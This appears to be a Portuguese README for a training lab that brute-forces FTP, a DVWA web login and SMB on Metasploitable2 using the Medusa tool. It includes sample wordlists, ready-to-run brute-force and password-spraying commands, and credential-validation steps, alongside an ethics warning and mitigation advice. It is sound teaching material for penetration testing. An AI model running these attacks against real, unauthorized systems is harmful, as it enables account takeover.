# Auditoria com Medusa (Kali) — Lab Metasploitable2 + DVWA

> **Aviso ético:** execute estes testes **somente** em ambientes controlados e autorizados (suas VMs). Ataques a sistemas sem permissão são ilegais.

---

## Índice
- [Resumo](#resumo)
- [Objetivo](#objetivo)
- [Arquitetura do laboratório](#arquitetura-do-laborat%C3%B3rio)
- [Pré-requisitos e checklist](#pr%C3%A9-requisitos-e-checklist)
- [Estrutura do repositório](#estrutura-do-reposit%C3%B3rio)
- [Wordlists de exemplo](#wordlists-de-exemplo)
- [Comandos Medusa — cenários práticos](#comandos-medusa--cen%C3%A1rios-pr%C3%A1ticos)
  - [FTP (usuário conhecido)](#ftp-usu%C3%A1rio-conhecido)
  - [FTP (usuários a partir de arquivo)](#ftp-usu%C3%A1rios-a-partir-de-arquivo)
  - [Formulário Web (DVWA)](#formul%C3%A1rio-web-dvwa)
  - [SMB / Password spraying](#smb--password-spraying)
- [Como validar acessos encontrados](#como-validar-acessos-encontrados)
- [Registro e logs — o que documentar](#registro-e-logs--o-que-documentar)
- [Recomendações de mitigação](#recomenda%C3%A7%C3%B5es-de-mitigacao)
- [Boas práticas e troubleshooting](#boas-pr%C3%A1ticas-e-troubleshooting)
- [Cronograma sugerido para entrega](#cronograma-sugerido-para-entrega)

---

## Resumo
Projeto de auditoria de força-bruta usando **Kali Linux** com a ferramenta **Medusa** contra ambientes vulneráveis (ex.: **Metasploitable2**, **DVWA**). O objetivo é demonstrar procedimentos de ataque controlado, registrar resultados e propor mitigação.

## Objetivo
- Configurar um laboratório seguro com duas VMs (Kali + alvo).
- Executar ataques de força-bruta em FTP, formulário web (DVWA) e SMB.
- Documentar comandos, wordlists, resultados e recomendações.

## Arquitetura do laboratório
- 2 VMs (VirtualBox recomendado):
  - **Kali Linux** (atacante) — ex.: `192.168.56.101`
  - **Metasploitable2** (alvo) — ex.: `192.168.56.102`
- Rede: **Host-only** ou **Internal Network** (isolar do restante da rede).
- Confirme conectividade: `ping 192.168.56.102`.

## Pré-requisitos e checklist
- [ ] Instalar Kali e Metasploitable2 no VirtualBox.
- [ ] Configurar rede Host-only / Internal.
- [ ] Atualizar o Kali (opcional, mas recomendado).
- [ ] Criar pasta de trabalho: `/home/kali/medusa-lab/`.
- [ ] Colocar wordlists em `/home/kali/medusa-lab/wordlists/`.
- [ ] Verificar medusa: `medusa -h`.

## Estrutura do repositório (sugestão)
```
/my-medusa-project
  /images
    ftp_result.png
    dvwa_result.png
    smb_result.png
  /wordlists
    users.txt
    passwords-small.txt
  README.md
  medusa_commands.txt
  medusa_logs/
    ftp.log
    dvwa.log
    smb.log
```

## Wordlists de exemplo
Coloque arquivos simples no repositório para testes iniciais (evite wordlists grandes em repositórios públicos):

`wordlists/users.txt`
```
admin
ftp
test
user
anonymous
```

`wordlists/passwords-small.txt`
```
123456
password
12345678
admin
1234
letmein
```

> Dica: comece com listas pequenas para validar o fluxo; só use listas maiores (ex.: `rockyou.txt`) se o laboratório suportar e você entender implicações éticas.

## Comandos Medusa — cenários práticos
> Antes de rodar, confira os módulos disponíveis: `medusa -d` e `medusa -M <module> -q` para ver opções do módulo.

### FTP (usuário conhecido)
```bash
medusa -h 192.168.56.102 -u ftp_username -P /home/kali/medusa-lab/wordlists/passwords-small.txt -M ftp -t 10 -f
```
Parâmetros principais:
- `-h` host
- `-u` usuário (use `-U arquivo` para múltiplos usuários)
- `-P` arquivo de senhas
- `-M` módulo (ftp)
- `-t` threads
- `-f` parar no primeiro login válido

### FTP (usuários a partir de arquivo)
```bash
medusa -h 192.168.56.102 -U /home/kali/medusa-lab/wordlists/users.txt -P /home/kali/medusa-lab/wordlists/passwords-small.txt -M ftp -t 8 -f
```

### Formulário Web (DVWA)
1. Identifique a **URL** do formulário e os nomes dos campos (use Developer Tools / View Source).
2. Exemplo de execução (ajuste a URL e nomes de campos conforme sua DVWA):
```bash
medusa -h 192.168.56.102 -U /home/kali/medusa-lab/wordlists/users.txt -P /home/kali/medusa-lab/wordlists/passwords-small.txt -M http -m FORM:/dvwa/vulnerabilities/brute/:username:password -t 10 -f
```
Notas:
- O módulo pode ter nome diferente (`http`, `web-form` etc.). Use `medusa -d` para confirmar.
- Formularios com CSRF ou cookies podem requerer passos adicionais (capturar e enviar cookie/session, fornecer header customizado).

### SMB / Password spraying
```bash
medusa -h 192.168.56.102 -U /home/kali/medusa-lab/wordlists/users.txt -P /home/kali/medusa-lab/wordlists/passwords-small.txt -M smbnt -t 8 -f
```
- Se o módulo `smbnt` não existir, verifique a lista de módulos (`medusa -d`) e use o nome correto (ex.: `smb` ou `smbnt`).
- Valide acessos com `smbclient` após encontrar credenciais.

## Como validar acessos encontrados
- **FTP**: conectar com `ftp` ou `lftp` e testar login.
  ```bash
  ftp 192.168.56.102
  # informar usuário/senha
  ```
- **HTTP (DVWA)**: use `curl` para submeter o formulário e verificar resposta.
  ```bash
  curl -i -X POST -d "username=usuario&password=senha&Login=Login" http://192.168.56.102/dvwa/vulnerabilities/brute/
  ```
- **SMB**: testar com `smbclient`:
  ```bash
  smbclient -L //192.168.56.102 -U usuario%senha
  ```

## Registro e logs — o que documentar
Para cada teste, registre:
- Data e hora (ex.: `2025-10-02 14:00`)
- IP do alvo e topologia
- Wordlists usadas (caminho e tamanho)
- Comando exato do Medusa (copiar e colar)
- Trecho do output com o resultado (ex.: `SUCCESS: host 192.168.56.102 user admin password 123456`)
- Capturas de tela organizadas em `/images/`
- Logs completos (salvar com `| tee medusa_ftp.log` ou usar opção `-O` do medusa quando aplicável)

## Recomendações de mitigação
- **Política de senhas fortes**: comprimento mínimo, complexidade, proibição de senhas comuns.
- **Bloqueio/Delay**: lockout temporário após N tentativas falhas ou aumento progressivo de delay.
- **Autenticação multifatorial (MFA)**: reduzir impacto de credenciais vazadas.
- **Monitoramento e alertas**: detectar tentativa massiva de login e bloquear/alertar.
- **Rate-limiting / WAF**: aplicar regras de proteção para formulários web.
- **Limitar exposição de serviços**: filtrar acessos por IPs e não expor serviços desnecessários.
- **Auditorias periódicas**: pentests controlados e rotação de senhas.

## Boas práticas e troubleshooting
- Use `medusa -d` para listar módulos e `medusa -M <mod> -q` para a ajuda do módulo.
- Ajuste `-t` (threads) conforme capacidade das VMs — threads muito altas podem travar o alvo.
- Para formularios web com CSRF, capture cookie/session e reproduza no `curl` ou adapte o `medusa` (alguns módulos aceitam `-m` para string de sucesso/erro).
- Para debugging, rode em modo verboso `-v` e salve saída com `| tee arquivo.log`.
- Evite usar wordlists grandes em repositórios públicos; disponibilize apenas amostras ou gere localmente.

## Cronograma sugerido para entrega
1. Configurar VMs e rede — 1–2 horas
2. Preparar wordlists e teste FTP básico — 1 hora
3. Formulário DVWA (investigar CSRF/cookies) — 1–2 horas
4. SMB / spray e validação — 1 hora
5. Documentação, screenshots e logs — 1–2 horas

---

## Observações finais
- Mantenha evidências (logs e screenshots) e inclua um resumo executivo no README (o que foi testado e o resultado principal).
- Se quiser, adicione scripts que automatizem a configuração do ambiente (por exemplo, `Vagrantfile` ou `docker-compose` para ambientes que suportem).

---

**Boa sorte!** Se quiser, eu gero agora os arquivos `users.txt` e `passwords-small.txt` prontos para download, e um arquivo `medusa_commands.txt` com os comandos usados. Diga qual opção prefere que eu crie primeiro.

